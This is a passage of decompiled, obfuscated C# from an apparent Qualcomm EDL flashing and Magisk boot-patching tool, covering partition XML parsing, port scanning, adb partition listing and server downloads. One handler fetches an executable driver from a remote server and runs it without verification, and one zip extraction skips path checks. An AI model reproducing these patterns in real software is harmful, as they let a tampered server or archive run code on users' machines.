		((UITextBox)this.m_c5).Clear();
		((UITextBox)this.m_c4).Clear();
		this.m_54 = null;
		((List<string>)this.m_73).Clear();
		object obj = new OpenFileDialog();
		try
		{
			((FileDialog)obj).Title = "请选择rawprogram*.xml";
			((FileDialog)obj).Filter = "XML files (rawprogram*.xml)|rawprogram0.xml;rawprogram1.xml;rawprogram2.xml;rawprogram3.xml;rawprogram4.xml;rawprogram5.xml;rawprogram6.xml;rawprogram7.xml;rawprogram8.xml;*unsparse*.xml;rawprogram*.xml";
			((OpenFileDialog)obj).Multiselect = true;
			if (((CommonDialog)obj).ShowDialog() == DialogResult.OK)
			{
				_17 = ((FileDialog)obj).FileNames;
				if (((Array)_17).Length != 0)
				{
					object directoryName = Path.GetDirectoryName((string)((object[])_17)[0]);
					((Control)this.m_c5).Text = (string)directoryName;
				}
				object obj2 = _17;
				for (nint num2 = 0; num2 < ((Array)obj2).Length; num2++)
				{
					object obj3 = ((object[])obj2)[num2];
					try
					{
						object obj4 = XDocument.Load((string)obj3);
						object obj5 = ((XContainer)obj4).Descendants((XName)"program");
						nint num3 = 0;
						object enumerator = ((IEnumerable<XElement>)obj5).GetEnumerator();
						try
						{
							while (((IEnumerator)enumerator).MoveNext())
							{
								object current = ((IEnumerator<XElement>)enumerator).Current;
								object obj6 = ((XElement)current).Attribute((XName)"filename")?.Value;
								object value = ((XElement)current).Attribute((XName)"label")?.Value;
								object obj7 = ((XElement)current).Attribute((XName)"start_sector")?.Value;
								object value2 = ((XElement)current).Attribute((XName)"num_partition_sectors")?.Value;
								object value3 = ((XElement)current).Attribute((XName)"physical_partition_number")?.Value;
								object obj8 = ((XElement)current).Attribute((XName)"SECTOR_SIZE_IN_BYTES")?.Value;
								object s = ((XElement)current).Attribute((XName)"size_in_KB")?.Value;
								if (string.IsNullOrEmpty((string)obj8))
								{
									obj8 = (((UIRadioButton)this.m_d9).Checked ? "512" : "4096");
								}
								if (num3 == 0)
								{
									object obj9 = ((XContainer)obj4).Descendants((XName)"xblgpt").FirstOrDefault();
									if (obj9 != null)
									{
										object item = ((XElement)obj9).Attribute((XName)"lun")?.Value;
										((List<string>)this.m_73).Add((string)item);
										num3 = 1;
									}
								}
								object value4;
								if (double.TryParse((string)s, out var result))
								{
									if (result >= 1048576.0)
									{
										value4 = (result / 1048576.0).ToString("F2") + " GB";
									}
									else
									{
										value4 = ((!(result >= 1024.0)) ? (result.ToString("F2") + " KB") : ((result / 1024.0).ToString("F2") + " MB"));
									}
								}
								else
								{
									long bytes = (long)Math.Round(Conversions.ToDouble((string)value2) * Conversions.ToDouble((string)obj8));
									value4 = _60(bytes);
								}
								if (((string)obj8).Contains("4096"))
								{
									((UIRadioButton)this.m_da).Checked = true;
								}
								else if (((string)obj8).Contains("512"))
								{
									((UIRadioButton)this.m_d9).Checked = true;
								}
								object value5 = "0x0";
								if (long.TryParse((string)obj7, out var result2) && long.TryParse((string)obj8, out var result3))
								{
									value5 = "0x" + (result2 * result3).ToString("X");
								}
								if (string.IsNullOrEmpty((string)obj6))
								{
									obj6 = "空文件";
								}
								object path = ((Control)this.m_c5).Text.Trim();
								object obj10 = Path.Combine((string)path, (string)obj6);
								nint num4 = ((!((string)obj6 == "空文件") && !((string)obj6 == "Null")) ? 1 : 0);
								nint num5 = ((DataGridView)this.m_143).Rows.Add();
								object obj11 = ((DataGridView)this.m_143).Rows[(int)num5];
								((DataGridViewRow)obj11).Cells["Check"].Value = (byte)num4 != 0;
								((DataGridViewRow)obj11).Cells["L"].Value = value3;
								((DataGridViewRow)obj11).Cells["name"].Value = value;
								((DataGridViewRow)obj11).Cells["filename"].Value = obj6;
								((DataGridViewRow)obj11).Cells["star"].Value = obj7;
								((DataGridViewRow)obj11).Cells["num"].Value = value2;
								((DataGridViewRow)obj11).Cells["Size"].Value = value4;
								((DataGridViewRow)obj11).Cells["filePath"].Value = ((num4 != 0) ? obj10 : "双击选择文件");
								((DataGridViewRow)obj11).Cells["Hex"].Value = value5;
								((DataGridView)this.m_143).ClearSelection();
							}
						}
						finally
						{
							((IDisposable)enumerator)?.Dispose();
						}
						((RichTextBox)this.m_c8).SelectionColor = Color.Black;
						((TextBoxBase)this.m_c8).AppendText("Reading Xml: ");
						((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
						((TextBoxBase)this.m_c8).AppendText(Path.GetFileName((string)obj3) + "\n");
						((TextBoxBase)this.m_c8).ScrollToCaret();
					}
					catch (Exception ex)
					{
						Msg("Error loading XML file " + (string)obj3 + ": " + ex.Message);
					}
				}
				nint num6 = 0;
				object enumerator2 = ((IEnumerable)((DataGridView)this.m_143).Rows).GetEnumerator();
				try
				{
					while (((IEnumerator)enumerator2).MoveNext())
					{
						object obj12 = (DataGridViewRow)((IEnumerator)enumerator2).Current;
						nint result4 = 0;
						if (((DataGridViewRow)obj12).Cells["Check"].Value != null)
						{
							NativeValues.TryParseBoolean(((DataGridViewRow)obj12).Cells["Check"].Value.ToString(), out result4);
						}
						if ((int)result4 != 0)
						{
							int num7 = (int)num6;
							num6 = num7 + 1;
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable disposable)
					{
						disposable.Dispose();
					}
				}
				object text = ((Control)this.m_c5).Text;
				((RichTextBox)this.m_c8).SelectionColor = Color.Black;
				((TextBoxBase)this.m_c8).AppendText("刷写分区数: ");
				((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
				((TextBoxBase)this.m_c8).AppendText($"{(int)num6}\n");
				((RichTextBox)this.m_c8).SelectionColor = Color.Black;
				((TextBoxBase)this.m_c8).AppendText("File : " + (string)text + "\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
				if (((UIRadioButton)this.m_d9).Checked)
				{
				}
				return;
			}
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
			((TextBoxBase)this.m_c8).AppendText("取消选择 Rawprogram \n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private void e6(object sender, EventArgs e)
	{
	}

	private void e7(object sender, EventArgs e)
	{
	}

	private void e8(object sender, EventArgs e)
	{
	}

	private void e9(object sender, EventArgs e)
	{
	}

	private void ea(object sender, EventArgs e)
	{
	}

	private void eb(object sender, object e)
	{
		if (((UICheckBox)this.m_c7).Checked)
		{
			try
			{
				string path = Path.Combine("C:\\", "TMFTool_Log");
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
				string text = DateTime.Now.ToString("yyyyMMddHHmmss");
				this.m_c = Path.Combine(path, text + ".txt");
				using (File.Create((string)this.m_c))
				{
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("创建日志文件时出错: " + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			((Control)this.m_c8).TextChanged -= ec;
			((Control)this.m_c8).TextChanged += ec;
		}
		else
		{
			((Control)this.m_c8).TextChanged -= ec;
		}
	}

	private void ec(object sender, object e)
	{
		if (!((UICheckBox)this.m_c7).Checked || string.IsNullOrEmpty((string)this.m_c))
		{
			return;
		}
		try
		{
			string text = ((Control)this.m_c8).Text;
			if (!string.IsNullOrEmpty(text) && text.Length > ((string)this.m_d).Length)
			{
				string text2 = text.Substring(((string)this.m_d).Length);
				if ((int)(nint)Form1.m_74 != 0)
				{
					string text3 = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
					text2 = text3 + "\r\n" + text2;
					Form1.m_74 = (IntPtr)0;
				}
				File.AppendAllText((string)this.m_c, text2);
				this.m_d = text;
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("写入日志文件时出错: " + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			((Control)this.m_c8).TextChanged -= ec;
		}
	}

	private void ed(object sender, int index, string text)
	{
	}

	private void ee(object sender, object e)
	{
		if (((UICheckBox)this.m_cc).Checked)
		{
			_18 = new System.Timers.Timer
			{
				Interval = 1000.0
			};
			((System.Timers.Timer)_18).Elapsed += ef;
			((System.Timers.Timer)_18).Start();
			return;
		}
		((System.Timers.Timer)_18)?.Stop();
		Msg("\n停止扫描端口\n");
		((Control)this).Invoke((Delegate)(Action)(() =>
		{
			((List<string>)this.m_75).Clear();
			((UIComboBox)this.m_126).Items.Clear();
			((Control)this.m_126).Text = string.Empty;
		}));
	}

	private void ef(object sender, object e)
	{
		List<string> list = (List<string>)f0();
		List<string> newlyConnected = new List<string>();
		List<string> disconnected = new List<string>();
		foreach (string item in list)
		{
			if (!((List<string>)this.m_75).Contains(item))
			{
				newlyConnected.Add(item);
			}
		}
		foreach (string item2 in (List<string>)this.m_75)
		{
			if (!list.Contains(item2))
			{
				disconnected.Add(item2);
			}
		}
		((List<string>)this.m_75).AddRange((IEnumerable<string>)newlyConnected);
		((List<string>)this.m_75).RemoveAll((Predicate<string>)((string p) => disconnected.Contains(p)));
		if (newlyConnected.Count == 0 && disconnected.Count == 0)
		{
			return;
		}
		((Control)this).Invoke((Delegate)(Action)(() =>
		{
			foreach (string item3 in disconnected)
			{
				((UIComboBox)this.m_126).Items.Remove(item3);
			}
			foreach (string item4 in newlyConnected)
			{
				((UIComboBox)this.m_126).Items.Insert(0, item4);
			}
			if (((UIComboBox)this.m_126).Items.Count > 0)
			{
				((UIComboBox)this.m_126).SelectedIndex = 0;
			}
			else
			{
				((Control)this.m_126).Text = string.Empty;
			}
			foreach (string item5 in newlyConnected)
			{
				Msg("\n");
				if (lang == "zh")
				{
					Msg("连接到 ");
				}
				else
				{
					Msg("Connect ");
				}
				((Checkbox)this.m_109).Checked = false;
				fa();
				Msg(item5 + "\n");
			}
			foreach (string item6 in disconnected)
			{
				Msg("\n");
				msgred();
				if (lang == "zh")
				{
					Msg(item6 + " 断开连接\n");
				}
				else
				{
					Msg(item6 + " Disconnect\n");
				}
				((Checkbox)this.m_109).Checked = false;
			}
		}));
	}

	private object f0()
	{
		string queryString = "SELECT * FROM Win32_PnPEntity WHERE Name LIKE '%Qualcomm HS-USB QDLoader 9008%'";
		List<string> list = new List<string>();
		try
		{
			using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
			foreach (ManagementObject item in managementObjectSearcher.Get())
			{
				string text = item["Name"]?.ToString();
				if (text != null)
				{
					Match match = Regex.Match(text, "Qualcomm HS-USB QDLoader 9008 \\((COM\\d+)\\)");
					if (match.Success)
					{
						list.Add(match.Groups[1].Value);
					}
				}
			}
		}
		catch (Exception ex)
		{
			Exception ex2 = ex;
			Exception ex3 = ex2;
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				Msg("该电脑系统不完整，无法使用自动识别端口技术: " + ex3.Message + "\n");
			}));
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				((UICheckBox)this.m_cc).Checked = false;
			}));
		}
		return list;
	}

	public async Task DownloadAndExtractBinAsync()
	{
		object requestUri = string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/bin.zip");
		object baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
		object obj = Path.Combine((string)baseDirectory, "bin");
		if (!Directory.Exists((string)obj))
		{
			Directory.CreateDirectory((string)obj);
		}
		object sourceArchiveFileName = Path.Combine((string)obj, "bin.zip");
		object obj2 = new HttpClient();
		try
		{
			object obj3 = await ((HttpClient)obj2).GetAsync((string)requestUri);
			if (((HttpResponseMessage)obj3).IsSuccessStatusCode)
			{
				object obj4 = new FileStream((string)sourceArchiveFileName, FileMode.Create, FileAccess.Write, FileShare.None);
				try
				{
					await ((HttpResponseMessage)obj3).Content.CopyToAsync((Stream)obj4);
				}
				finally
				{
					((IDisposable)obj4)?.Dispose();
				}
				ZipFile.ExtractToDirectory((string)sourceArchiveFileName, (string)obj);
				if (File.Exists((string)sourceArchiveFileName))
				{
					File.Delete((string)sourceArchiveFileName);
				}
			}
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
	}

	private async void f2(object sender, object e)
	{
		object obj = new OpenFileDialog
		{
			Filter = "Magisk Files (*.zip;*.apk)|*.zip;*.apk",
			Title = "选择 Magisk 文件"
		};
		if (((CommonDialog)obj).ShowDialog() != DialogResult.OK)
		{
			return;
		}
		object fileName = ((FileDialog)obj).FileName;
		object obj2 = Path.Combine(Path.GetTempPath(), Path.GetFileNameWithoutExtension((string)fileName) + ".zip");
		if (Path.GetExtension((string)fileName).ToLower() == ".apk")
		{
			File.Copy((string)fileName, (string)obj2, overwrite: true);
			((TextBoxBase)this.m_c8).AppendText("已选择 APK 文件" + (string)fileName + Environment.NewLine);
		}
		else
		{
			obj2 = fileName;
			((TextBoxBase)this.m_c8).AppendText("已选择 ZIP 文件: " + (string)fileName + Environment.NewLine);
		}
		object path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "temp");
		if (Directory.Exists((string)path))
		{
			try
			{
				Directory.Delete((string)path, recursive: true);
				Directory.CreateDirectory((string)path);
			}
			catch (Exception ex)
			{
				object obj3 = ex;
				((TextBoxBase)this.m_c8).AppendText("清空临时文件夹失败：" + ((Exception)obj3).Message + Environment.NewLine);
				return;
			}
		}
		else
		{
			Directory.CreateDirectory((string)path);
		}
		try
		{
			object obj4 = ZipFile.OpenRead((string)obj2);
			try
			{
				object enumerator = ((ZipArchive)obj4).Entries.GetEnumerator();
				try
				{
					while (((IEnumerator)enumerator).MoveNext())
					{
						object current = ((IEnumerator<ZipArchiveEntry>)enumerator).Current;
						object destinationFileName = Path.Combine((string)path, ((ZipArchiveEntry)current).FullName);
						object directoryName = Path.GetDirectoryName((string)destinationFileName);
						if (!Directory.Exists((string)directoryName))
						{
							Directory.CreateDirectory((string)directoryName);
						}
						((ZipArchiveEntry)current).ExtractToFile((string)destinationFileName, overwrite: true);
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)obj4)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		object obj5 = Path.Combine((string)path, "assets", "util_functions.sh");
		if (!File.Exists((string)obj5))
		{
			return;
		}
		object obj6 = File.ReadAllLines((string)obj5);
		object obj7 = null;
		object obj8 = null;
		object obj9 = obj6;
		for (nint num = 0; num < ((Array)obj9).Length; num++)
		{
			object obj10 = ((object[])obj9)[num];
			if (((string)obj10).StartsWith("MAGISK_VER="))
			{
				obj7 = ((string)obj10).Substring("MAGISK_VER=".Length).Trim('\'', ' ');
			}
			else if (((string)obj10).StartsWith("MAGISK_VER_CODE="))
			{
				obj8 = ((string)obj10).Substring("MAGISK_VER_CODE=".Length).Trim('\'', ' ');
			}
			if (obj7 != null && obj8 != null)
			{
				break;
			}
		}
		if (obj7 != null && obj8 != null)
		{
			((TextBoxBase)this.m_c8).AppendText("当前面具名: " + (string)obj7 + Environment.NewLine);
			((TextBoxBase)this.m_c8).ScrollToCaret();
			((TextBoxBase)this.m_c8).AppendText("当前版本: " + (string)obj8 + Environment.NewLine);
			((TextBoxBase)this.m_c8).ScrollToCaret();
			object baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			object obj11 = Path.Combine((string)baseDirectory, "bin");
			Msg("当前仅支持-Magisk德尔塔-Magisk官方（29不在支持范围）待后续支持\n");
			if (Directory.Exists((string)obj11))
			{
				Directory.Delete((string)obj11, recursive: true);
			}
			((Control)this.m_100).Enabled = false;
			((TextBoxBase)this.m_c8).AppendText("开始配置环境" + Environment.NewLine);
			((TextBoxBase)this.m_c8).ScrollToCaret();
			await DownloadAndExtractBinAsync();
			((Control)this.m_100).Enabled = true;
		}
		else
		{
			((TextBoxBase)this.m_c8).AppendText("未能找到 MAGISK_VER 或 MAGISK_VER_CODE 信息。" + Environment.NewLine);
		}
		object path2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "bin");
		object path3 = Path.Combine((string)path, "lib", "arm64-v8a");
		object path4 = Path.Combine((string)path, "lib", "armeabi-v7a");
		if (Directory.Exists((string)path3))
		{
			f4(Path.Combine((string)path2, "magisk64"));
			f4(Path.Combine((string)path2, "magiskinit"));
			object sourceFileName = Path.Combine((string)path3, "libmagisk64.so");
			if (File.Exists((string)sourceFileName))
			{
				File.Copy((string)sourceFileName, Path.Combine((string)path2, "magisk64"), overwrite: true);
			}
			object sourceFileName2 = Path.Combine((string)path3, "libmagiskinit.so");
			if (File.Exists((string)sourceFileName2))
			{
				File.Copy((string)sourceFileName2, Path.Combine((string)path2, "magiskinit"), overwrite: true);
			}
		}
		if (Directory.Exists((string)path4))
		{
			f4(Path.Combine((string)path2, "magisk32"));
			object sourceFileName3 = Path.Combine((string)path4, "libmagisk32.so");
			if (File.Exists((string)sourceFileName3))
			{
				File.Copy((string)sourceFileName3, Path.Combine((string)path2, "magisk32"), overwrite: true);
			}
			if (!File.Exists(Path.Combine((string)path3, "libmagiskinit.so")))
			{
				object sourceFileName4 = Path.Combine((string)path4, "libmagiskinit.so");
				if (File.Exists((string)sourceFileName4))
				{
					File.Copy((string)sourceFileName4, Path.Combine((string)path2, "magiskinit"), overwrite: true);
				}
			}
		}
		object obj12 = new OpenFileDialog
		{
			Filter = "Image Files|*.img",
			Title = "选择 boot.img 文件"
		};
		if (((CommonDialog)obj12).ShowDialog() != DialogResult.OK)
		{
			return;
		}
		object fileName2 = ((FileDialog)obj12).FileName;
		object obj13 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "boot.img");
		if (!string.Equals(Path.GetFileName((string)fileName2), "boot.img", StringComparison.OrdinalIgnoreCase))
		{
			try
			{
				File.Move((string)fileName2, (string)obj13);
				((TextBoxBase)this.m_c8).AppendText("文件已重命名为 boot.img。" + Environment.NewLine);
			}
			catch (Exception ex)
			{
				object obj14 = ex;
				((TextBoxBase)this.m_c8).AppendText("重命名文件失败：" + ((Exception)obj14).Message + Environment.NewLine);
				object baseDirectory2 = AppDomain.CurrentDomain.BaseDirectory;
				object obj15 = Path.Combine((string)baseDirectory2, "bin");
				if (Directory.Exists((string)obj15))
				{
					Directory.Delete((string)obj15, recursive: true);
				}
				return;
			}
		}
		else
		{
			File.Copy((string)fileName2, (string)obj13, overwrite: true);
		}
		object busyboxPath = Path.Combine((string)path2, "busybox.exe");
		object bootPatchScript = Path.Combine((string)path2, "boot_patch.sh");
		((TextBoxBase)this.m_c8).AppendText("修补操作开始，请稍等..." + Environment.NewLine);
		((TextBoxBase)this.m_c8).ScrollToCaret();
		((Control)this.m_100).Text = "修补中";
		((Control)this.m_100).Enabled = false;
		nint num2 = ((await f3(busyboxPath, bootPatchScript, obj13)) ? 1 : 0);
		IntPtr intPtr = num2;
		if ((int)(nint)intPtr == 0)
		{
			return;
		}
		object sourceFileName5 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "new-boot.img");
		object obj16 = (string)obj7 + (string)obj8 + ".img";
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		object destFileName = Path.Combine((string)folderPath, (string)obj16);
		if (!File.Exists((string)sourceFileName5))
		{
			return;
		}
		try
		{
			if (File.Exists((string)destFileName))
			{
				File.Delete((string)destFileName);
			}
			File.Move((string)sourceFileName5, (string)destFileName);
			((TextBoxBase)this.m_c8).AppendText("新的 boot.img 已移动到桌面，文件名为: " + (string)obj16 + Environment.NewLine);
			((TextBoxBase)this.m_c8).ScrollToCaret();
			object baseDirectory3 = AppDomain.CurrentDomain.BaseDirectory;
			object obj17 = Path.Combine((string)baseDirectory3, "bin");
			if (Directory.Exists((string)obj17))
			{
				Directory.Delete((string)obj17, recursive: true);
			}
			if (File.Exists((string)obj13))
			{
				File.Delete((string)obj13);
				((Control)this.m_100).Enabled = true;
				((Control)this.m_100).Text = "制作Boot";
			}
		}
		catch (Exception ex)
		{
			object obj18 = ex;
			((TextBoxBase)this.m_c8).AppendText("移动或删除文件失败：" + ((Exception)obj18).Message + Environment.NewLine);
			object baseDirectory4 = AppDomain.CurrentDomain.BaseDirectory;
			object obj19 = Path.Combine((string)baseDirectory4, "bin");
			if (Directory.Exists((string)obj19))
			{
				Directory.Delete((string)obj19, recursive: true);
			}
			((Control)this.m_100).Text = "制作Boot";
			((Control)this.m_100).Enabled = true;
		}
		finally
		{
			if (Directory.Exists((string)path))
			{
				try
				{
					Directory.Delete((string)path, recursive: true);
				}
				catch
				{
				}
			}
			((Control)this.m_100).Text = "制作Boot";
			((Control)this.m_100).Enabled = true;
		}
	}

	private async Task<bool> f3(object busyboxPath, object bootPatchScript, object targetBootPath)
	{
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)busyboxPath,
				Arguments = "bash \"" + (string)bootPatchScript + "\" \"" + (string)targetBootPath + "\"",
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				((Process)obj).Start();
				await ((Process)obj).StandardOutput.ReadToEndAsync();
				object obj2 = await ((Process)obj).StandardError.ReadToEndAsync();
				await ((Process)obj).WaitForExitAsync();
				if (((Process)obj).ExitCode == 0)
				{
					((TextBoxBase)this.m_c8).AppendText("修补完成！" + Environment.NewLine);
					return true;
				}
				((TextBoxBase)this.m_c8).AppendText("修补失败：" + (string)obj2 + Environment.NewLine);
				return false;
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj3 = ex;
			((TextBoxBase)this.m_c8).AppendText("执行 busybox 失败：" + ((Exception)obj3).Message + Environment.NewLine);
			return false;
		}
	}

	private void f4(object filePath)
	{
		if (File.Exists((string)filePath))
		{
			try
			{
				File.Delete((string)filePath);
			}
			catch (Exception ex)
			{
				((TextBoxBase)this.m_c8).AppendText("删除文件失败：" + ex.Message + Environment.NewLine);
			}
		}
	}

	private async void f5(object sender, object e)
	{
		((UIProcessBar)this.m_c1).Maximum = 100;
		object obj = "?encryptedRequest=" + await _21();
		((Control)this.m_ce).Text = "下载中";
		((Control)this.m_ce).Enabled = false;
		object requestUri = (string)this.m_25 + "/TMFTool/QmDriver.exe" + (string)obj;
		object fileName = Path.Combine(Path.GetTempPath(), "QmDriver.exe");
		try
		{
			object obj2 = new HttpClient();
			try
			{
				((HttpClient)obj2).Timeout = TimeSpan.FromMinutes(30.0);
				object obj3 = await ((HttpClient)obj2).GetAsync((string)requestUri, HttpCompletionOption.ResponseHeadersRead);
				try
				{
					((HttpResponseMessage)obj3).EnsureSuccessStatusCode();
					long num = ((HttpResponseMessage)obj3).Content.Headers.ContentLength ?? (-1);
					object obj4 = await ((HttpResponseMessage)obj3).Content.ReadAsStreamAsync();
					try
					{
						object obj5 = new FileStream((string)fileName, FileMode.Create, FileAccess.Write, FileShare.None, 8192, useAsync: true);
						try
						{
							object obj6 = new byte[8192];
							long num2 = 0L;
							while (true)
							{
								nint num3 = await ((Stream)obj4).ReadAsync((byte[])obj6, 0, ((Array)obj6).Length);
								int num4 = (int)num3;
								IntPtr intPtr = num3;
								if (num4 <= 0)
								{
									break;
								}
								await ((Stream)obj5).WriteAsync((byte[])obj6, 0, (int)(nint)intPtr);
								num2 += (nint)intPtr;
								if (num > 0)
								{
									nint num5 = (int)(num2 * 100 / num);
									((UIProcessBar)this.m_c1).Value = (int)num5;
								}
								_ = (double)num2 / 1048576.0;
							}
						}
						finally
						{
							((IDisposable)obj5)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)obj4)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)obj3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)obj2)?.Dispose();
			}
			((Control)this.m_ce).Text = "安装高通驱动";
			((Control)this.m_ce).Enabled = true;
			((TextBoxBase)this.m_c8).AppendText("驱动已就绪\n");
			((TextBoxBase)this.m_c8).SelectionStart = ((Control)this.m_c8).Text.Length;
			((TextBoxBase)this.m_c8).ScrollToCaret();
			Process.Start((string)fileName);
		}
		catch (Exception ex)
		{
			object obj7 = ex;
			((Control)this.m_ce).Text = "安装高通驱动";
			((Control)this.m_ce).Enabled = true;
			((TextBoxBase)this.m_c8).AppendText("下载失败: " + ((Exception)obj7).Message + "\n");
			((TextBoxBase)this.m_c8).SelectionStart = ((Control)this.m_c8).Text.Length;
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	private void f6(object sender, object e)
	{
		string text = ((UIComboBox)this.m_10a).SelectedItem.ToString();
		if (text == "官方:高通骁龙芯片（Qualcomm XiaoLong EDL ELF）" || text == "官方:小米红米黑鲨865_870自选引导")
		{
			((Control)this.m_c3).ForeColor = Color.Black;
			((Control)this.m_c3).Text = "";
		}
		else
		{
			((Control)this.m_c3).ForeColor = Color.DodgerBlue;
			if (lang == "zh")
			{
				((Control)this.m_c3).Text = "云端自动转译当前芯片引导";
			}
			else
			{
				((Control)this.m_c3).Text = "The server will match this boot";
			}
		}
		if (text.Contains("636") || text.Contains("660") || text.Contains("665") || text.Contains("680") || text.Contains("710") || text.Contains("425"))
		{
			((UIRadioButton)this.m_d9).Checked = true;
		}
		else
		{
			((UIRadioButton)this.m_da).Checked = true;
		}
	}

	private async void f7(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		((UITextBox)this.m_d5).Clear();
		falseButtons();
		fe("[TWRP] 读取分区表...");
		((CheckBox)this.m_d6).Checked = false;
		object adbPath = Path.Combine("C:\\TMFTool", "mi_adb.exe");
		if (!File.Exists((string)adbPath))
		{
			((TextBoxBase)this.m_c8).AppendText("adb.exe 不存在，请检查文件路径。\n");
			return;
		}
		try
		{
			object obj = await f8(adbPath, "shell ls -l /dev/block/by-name");
			((ListView)this.m_d0).Items.Clear();
			if (!string.IsNullOrEmpty((string)obj))
			{
				object obj2 = ((string)obj).Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
				object obj3 = obj2;
				for (nint num2 = 0; num2 < ((Array)obj3).Length; num2++)
				{
					object obj4 = ((object[])obj3)[num2];
					nint num3 = ((string)obj4).IndexOf("->");
					if (num3 > 0)
					{
						object obj5 = ((string)obj4).Substring(0, (int)num3).Trim();
						object source = ((string)obj5).Split(new char[1] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
						object obj6 = ((IEnumerable<string>)source).LastOrDefault();
						object obj7 = ((string)obj4).Substring((int)(num3 + 2)).Trim();
						object text = "";
						nint num4 = ((string)obj7).IndexOf("/block/");
						if (num4 >= 0)
						{
							text = ((string)obj7).Substring((int)(num4 + "/block/".Length)).Trim();
						}
						if (!string.IsNullOrEmpty((string)obj6))
						{
							object value = new ListViewItem((string)obj6)
							{
								SubItems = 
								{
									"空文件",
									(string)text,
									"双击选择文件",
									""
								}
							};
							((ListView)this.m_d0).Items.Add((ListViewItem)value);
						}
					}
				}
			}
			object obj8 = await f8(adbPath, "shell cat /proc/partitions");
			object obj9 = new Dictionary<string, long>();
			object obj10 = ((string)obj8).Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
			object obj11 = obj10;
			for (nint num5 = 0; num5 < ((Array)obj11).Length; num5++)
			{
				object obj12 = ((object[])obj11)[num5];
				if (((string)obj12).TrimStart(Array.Empty<char>()).StartsWith("major") || string.IsNullOrWhiteSpace((string)obj12))
				{
					continue;
				}
				object obj13 = ((string)obj12).Split(new char[1] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
				if (((Array)obj13).Length >= 4)
				{
					object key = ((object[])obj13)[3];
					if (long.TryParse((string)((object[])obj13)[2], out var result))
					{
						((Dictionary<string, long>)obj9)[(string)key] = result * 1024;
					}
				}
			}
			object enumerator = ((ListView)this.m_d0).Items.GetEnumerator();
			try
			{
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj14 = (ListViewItem)((IEnumerator)enumerator).Current;
					if (((ListViewItem)obj14).SubItems.Count >= 3)
					{
						object text2 = ((ListViewItem)obj14).SubItems[2].Text;
						if (((Dictionary<string, long>)obj9).TryGetValue((string)text2, out long value2))
						{
							((ListViewItem)obj14).SubItems[4].Text = (string)_60(value2);
						}
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			await _13c();
			EnableButtons();
		}
		catch (Exception ex)
		{
			object obj15 = ex;
			EnableButtons();
			((TextBoxBase)this.m_c8).AppendText("执行过程中出现错误: " + ((Exception)obj15).Message + "\n");
		}
		finally
		{
			((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
		}
	}

	private async Task<string> f8(object adbPath, object arguments)
	{
		object startInfo = new ProcessStartInfo
		{
			FileName = (string)adbPath,
			Arguments = (string)arguments,
			UseShellExecute = false,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			CreateNoWindow = true
		};
		object obj = new Process
		{
			StartInfo = (ProcessStartInfo)startInfo
		};
		try
		{
			((Process)obj).Start();
			object result = await ((Process)obj).StandardOutput.ReadToEndAsync();
			await ((Process)obj).StandardError.ReadToEndAsync();
			((Process)obj).WaitForExit();
			return (string)result;
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private void f9(object sender, object e)
	{
		if (((ListView)this.m_d0).SelectedItems.Count <= 0)
		{
			return;
		}
		ListViewItem listViewItem = ((ListView)this.m_d0).SelectedItems[0];
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "IMG files (*.img)|*.img|All files (*.*)|*.*";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			string fileName = Path.GetFileName(openFileDialog.FileName);
			string fileName2 = openFileDialog.FileName;
			listViewItem.SubItems[1].Text = fileName;
			string text = (string)_186(fileName2);
			listViewItem.SubItems[3].Text = fileName2;
			listViewItem.SubItems[4].Text = text;
			((ListView)this.m_d0).SelectedItems[0].Checked = true;
		}
	}

